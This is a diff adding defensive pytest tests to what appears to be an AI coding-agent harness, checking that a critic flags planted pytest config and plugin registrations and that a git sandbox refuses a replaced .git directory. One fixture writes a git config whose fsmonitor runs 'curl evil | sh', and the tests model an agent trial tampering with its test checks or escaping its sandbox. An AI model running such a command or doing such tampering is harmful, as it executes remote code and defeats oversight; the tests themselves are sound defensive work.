@@ -162,3 +162,58 @@ def test_a_shadowing_package_and_a_test_helper_are_contract(tmp_path):
     findings = critic._check_contract(tmp_path, contract)
     checks = {f.check for f in findings}
     assert checks == {"tests_modified", "tests_infra_modified"}
+
+
+def test_dot_pytest_ini_and_packaging_metadata_are_contract(tmp_path):
+    """Audit C3: `.pytest.ini` and a `*.dist-info` plugin registration were invisible."""
+    (tmp_path / "test_a.py").write_text("def test_a():\n    assert True\n")
+    critic = PstackCritic(test_command=(sys.executable, "-m", "pytest", "-q"))
+    contract = critic.snapshot_contract(tmp_path)
+
+    (tmp_path / ".pytest.ini").write_text("[pytest]\naddopts = -p no:cacheprovider\n")
+    (tmp_path / "sneaky-1.0.dist-info").mkdir()
+    (tmp_path / "sneaky-1.0.dist-info" / "entry_points.txt").write_text(
+        "[pytest11]\nsneaky = sneaky\n"
+    )
+
+    checks = {f.check for f in critic._check_contract(tmp_path, contract)}
+    assert checks == {"tests_infra_modified"}
+
+
+def test_the_gate_disables_plugin_autoload(monkeypatch):
+    from dacode.discipline.critic import _gate_env
+
+    monkeypatch.delenv("DACODE_GATE_PLUGIN_AUTOLOAD", raising=False)
+    assert _gate_env()["PYTEST_DISABLE_PLUGIN_AUTOLOAD"] == "1"
+
+    monkeypatch.setenv("DACODE_GATE_PLUGIN_AUTOLOAD", "1")
+    assert "PYTEST_DISABLE_PLUGIN_AUTOLOAD" not in _gate_env()
+
+
+def test_checkpoint_refuses_a_git_directory_in_the_worktree(tmp_path):
+    """Audit C1: a trial could ship core.fsmonitor / a hook and have the host run it."""
+    from dacode.sandbox import SandboxError
+
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    for cmd in (
+        ("git", "init", "-q", "-b", "main"),
+        ("git", "config", "user.email", "t@test.local"),
+        ("git", "config", "user.name", "T"),
+    ):
+        subprocess.run(cmd, cwd=str(repo), check=True, capture_output=True)
+    (repo / "README.md").write_text("x")
+    subprocess.run(("git", "add", "-A"), cwd=str(repo), check=True, capture_output=True)
+    subprocess.run(("git", "commit", "-qm", "init"), cwd=str(repo), check=True, capture_output=True)
+
+    sandbox = GitSandbox(repo, sandbox_root=tmp_path / "worktrees")
+    workspace = sandbox.create("trial-git-dir")
+
+    imported = workspace / ".git"
+    assert imported.is_file()
+    imported.unlink()
+    (imported / "hooks").mkdir(parents=True)
+    (imported / "config").write_text("[core]\n\tfsmonitor = curl evil | sh\n")
+
+    with pytest.raises(SandboxError, match="worktree pointer file"):
+        sandbox.checkpoint("trial-git-dir", "should never run")
